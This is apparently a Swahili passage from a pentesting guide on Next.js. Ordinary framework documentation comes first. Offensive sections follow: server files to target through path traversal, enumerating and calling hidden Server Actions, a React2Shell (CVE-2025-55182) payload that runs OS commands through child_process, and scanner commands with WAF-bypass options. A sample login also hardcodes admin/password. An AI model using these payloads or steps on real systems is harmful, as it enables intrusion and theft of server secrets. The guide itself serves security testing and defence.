### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Madhumuni:** Overrides the default App component, allowing for global state, styles, and layout components.

**Matumizi:**

- Injecting global CSS.
- Adding layout wrappers.
- Integrating state management libraries.

**Mfano:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Madhumuni:** Inabadilisha Document ya default, ikiruhusu kubinafsisha vitambulisho vya `<html>` na `<body>`.

**Matumizi:**

- Kubadilisha `<html>` au `<body>` tags.
- Kuongeza meta tags au skripti maalum.
- Kuingiza fonti za wahusika wa tatu.

**Mfano:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Seva Maalum (Hiari)

**Madhumuni:** Ingawa Next.js inakuja na seva iliyojengwa ndani, unaweza kuunda seva maalum kwa matumizi ya hali ya juu kama routing maalum au kuunganisha na huduma za backend zilizopo.

**Kumbuka:** Kutumia seva maalum kunaweza kupunguza chaguzi za deployment, hasa kwenye majukwaa kama Vercel ambayo yameboreshwa kwa seva iliyojengwa ya Next.js.

**Mfano:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Mambo ya Ziada ya Miundo na Usalama

### Vigezo vya Mazingira na Usanidi

**Madhumuni:** Kusimamia taarifa nyeti na mipangilio ya usanidi nje ya msimbo.

**Mbinu Bora:**

- **Tumia faili za `.env`:** Hifadhi vigezo kama API keys katika `.env.local` (imeachwa nje ya udhibiti wa toleo).
- **Fikia vigezo kwa usalama:** Tumia `process.env.VARIABLE_NAME` kufikia vigezo vya mazingira.
- **Usifunue siri upande wa mteja:** Hakikisha vigezo nyeti vinatumiwa upande wa seva pekee.

**Mfano:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Note:** Ili kuzuia variables kuwa upande wa server pekee, usiweke kwenye object `env` au ziweke mbele na `NEXT_PUBLIC_` ili ziweze kuonekana kwa client.

### Useful server artifacts to target via LFI/download endpoints

Ukipata path traversal au download API katika app ya Next.js, lenga compiled artifacts ambazo leak server-side secrets na auth logic:

- `.env` / `.env.local` kwa session secrets na provider credentials.
- `.next/routes-manifest.json` and `.next/build-manifest.json` kwa orodha kamili ya routes.
- `.next/server/pages/api/auth/[...nextauth].js` kurejesha compiled NextAuth configuration (mara nyingi huwa na fallback passwords wakati `process.env` values hazijafanikiwa).
- `next.config.js` / `next.config.mjs` kwa kuchunguza rewrites, redirects na middleware routing.

### Uthibitishaji na Uidhinishaji

**Mbinu:**

- **Session-Based Authentication:** Tumia cookies kusimamia sessions za watumiaji.
- **Token-Based Authentication:** Tumia JWTs kwa authentication isiyo na state.
- **Third-Party Providers:** Unganisha na OAuth providers (mfano, Google, GitHub) kwa kutumia maktaba kama `next-auth`.

**Mazoezi ya Usalama:**

- **Secure Cookies:** Weka atributi `HttpOnly`, `Secure`, na `SameSite`.
- **Password Hashing:** Daima hash nywila kabla ya kuziweka.
- **Input Validation:** Zuia injection attacks kwa kuthibitisha na kusafisha inputs.

**Mfano:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Uboreshaji wa Utendaji

**Mikakati:**

- **Uboreshaji wa Picha:** Tumia Next.js's `next/image` component kwa uboreshaji wa picha kiotomatiki.
- **Ugawaji wa Msimbo:** Tumia dynamic imports kugawanya msimbo na kupunguza muda wa upakiaji wa awali.
- **Caching:** Tekeleza mikakati ya caching kwa majibu ya API na static assets.
- **Lazy Loading:** Pakia komponenti au rasilimali tu wakati zinapohitajika.

**Mfano:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Next.js ya kisasa inatumia “Server Actions” zinazotekelezwa kwenye seva lakini zinaitwa kutoka kwa mteja. Katika uzalishaji, miito hii haionekani wazi: POST zote zinafika kwenye endpoint moja ya pamoja na zinafahamishwa na hash maalum ya build inayotumwa katika header `Next-Action`. Mfano:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wakati `productionBrowserSourceMaps` imewezeshwa, vipande vya minified JS vinajumuisha miito ya `createServerReference(...)` ambayo leak muundo wa kutosha (pamoja na source maps zinazohusiana) ili kupata ramani kati ya action hash na jina la function la awali. Hii inakuwezesha kutafsiri hashes zinazooonekana katika `Next-Action` kuwa malengo maalum kama `deleteUserAccount()` au `exportFinancialData()`.

### Mbinu ya uchimbaji (regex on minified JS + optional source maps)

Tafuta vipande vya JS uliopakua kwa `createServerReference` na chota hash pamoja na function/source symbol. Mifumo miwili muhimu:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Kikundi 1: server action hash (40+ hex chars)
- Kikundi 2: symbol or path ambayo inaweza kutatuliwa hadi jina la original function kupitia source map inapokuwepo

Ikiwa script inatangaza source map (trailer comment `//# sourceMappingURL=<...>.map`), ipate na tatua symbol/path hadi jina la original function.

### Mtiririko wa vitendo

- Ugunduzi pasivu wakati wa kuvinjari: rekodi requests zenye `Next-Action` headers na JS chunk URLs.
- Pakua JS bundles zilizotajwa na faili za `*.map` zinazofuatana (inapokuwepo).
- Endesha regex iliyo hapo juu ili kujenga kamusi ya hash↔name.
- Tumia kamusi kulenga upimaji:
- Name-driven triage (e.g., `transferFunds`, `exportFinancialData`).
- Fuata coverage across builds kwa jina la function (hashes rotate across builds).

### Kufanya hidden actions (template-based request)

Chukua POST halali uliyoiona kupitia proxy kama template na badilisha thamani ya `Next-Action` ili kulenga action nyingine uliyoigundua:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Rudisha katika Repeater na jaribu uthibitishaji, uhakiki wa pembejeo na mantiki ya biashara ya vitendo visivyopatikana vinginevyo.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) hutoa ut automatishemu wa hapo juu ndani ya Burp:
- Huchimba proxy history kwa JS chunks, hutenganisha `createServerReference(...)` entries, na huchambua source maps inapopatikana.
- Inatunza kamusi inayoweza kutafutwa ya hash↔function-name na huondoa rudufu kwenye builds kwa jina la function.
- Inaweza kupata template POST halali na kufungua tab ya Repeater tayari-kutumwa na hash ya action lengwa ikibadilishwa.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Vidokezo na mipaka

- Inahitaji `productionBrowserSourceMaps` iwe imewezeshwa katika production ili kurejesha majina kutoka bundles/source maps.
- Function-name disclosure si udhaifu kwa nafsi yake; itumie kuongoza ugunduzi na kujaribu uthibitishaji wa kila action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Deployments za Next.js App Router zinazofichua Server Actions kwenye `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** zina uchafuzi muhimu wa prototype upande wa server wakati wa deserialization ya **Flight** chunks. Kwa kuunda marejeleo ya `$` ndani ya payload ya Flight mshambuliaji anaweza kuhamia kutoka kwa prototypes zilizochafuka hadi utekelezaji wa JavaScript bila kikomo na kisha hadi utekelezaji wa amri za OS ndani ya mchakato wa Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Ramani ya uwekaji wazi wa React Server Function

React Server Functions (RSF) ni functions yoyote inayojumuisha directive `'use server';`. Kila form action, mutation, au fetch helper iliyounganishwa na mojawapo ya functions hizo inakuwa RSC Flight endpoint ambayo kwa urahisi ita-deserialize payloads zinazotolewa na mshambuliaji. Hatua za recon zinazofaa zilizotokana na tathmini za React2Shell:

- **Static inventory:** angalia directive ili kuelewa ni RSF ngapi zinatolewa kiotomatiki na framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` inafanya App Router + `app/` directory iweze kutumika kwa default, ambayo kwa kimya inageuza kila route kuwa endpoint inayoweza RSC. App Router assets kama `/_next/static/chunks/app/` au responses zinazotiririsha Flight chunks kupitia `text/x-component` ni fingerprints zenye nguvu zinazoonekana mtandaoni.
- **Implicitly vulnerable RSC deployments:** React’s own advisory inaonyesha kuwa apps zinazochukua RSC runtime zinaweza kushambuliwa **hata bila RSFs wazi**, hivyo chukulia build yoyote inayotumia `react-server-dom-*` 19.0.0–19.2.0 kuwa shaka.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. zinatumia serializer ile ile na kurithisha remote attack surface sawa hadi zikiingiza patched React builds.

#### Ufunikaji wa matoleo (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **zilizo na udhaifu** katika 19.0.0, 19.1.0–19.1.1 na 19.2.0; **zilizosahihishwa** katika 19.0.1, 19.1.2 na 19.2.1 mtawalia.
- **Next.js stable:** Matoleo ya App Router 15.0.0–16.0.6 yanaingiza RSC stack yenye udhaifu. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 zinajumuisha deps zilizorekebishwa, hivyo build yoyote chini ya matoleo hayo ni ya thamani kubwa.
- **Next.js canary:** `14.3.0-canary.77+` pia inaleta runtime yenye hitilafu na kwa sasa haina canary drops zilizosahihishwa, zikifanya fingerprints hizo kuwa wagombea wenye nguvu kwa exploitation.

#### Oracle ya utambuzi wa mbali

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) inatuma crafted multipart Flight request kwa path zinazowezekana na inatazama tabia ya upande wa server:

- **Default mode** inatekeleza deterministic RCE payload (operesheni ya hisabati inayorejeshwa kupitia `X-Action-Redirect`) ikithibitisha utekelezaji wa code.
- **`--safe-check` mode** inalenga kukosea kwa makusudi ujumbe wa Flight ili servers zilizosahihishwa zirudishe `200/400`, wakati targets zilizo na udhaifu zitoe majibu ya `HTTP/500` yanayojumuisha substring `E{"digest"` ndani ya body. Pamoja ya `(500 + digest)` kwa sasa ndiyo oracle ya mbali inayotegemewa zaidi iliyochapishwa na walinzi.
- Vibadilishaji vilivyojengewa ndani `--waf-bypass`, `--vercel-waf-bypass`, na `--windows` vinabadilisha muundo wa payload, kuambatanisha junk, au kubadilisha amri za OS ili uweze kuchunguza assets halisi za Internet.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Marejeleo

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
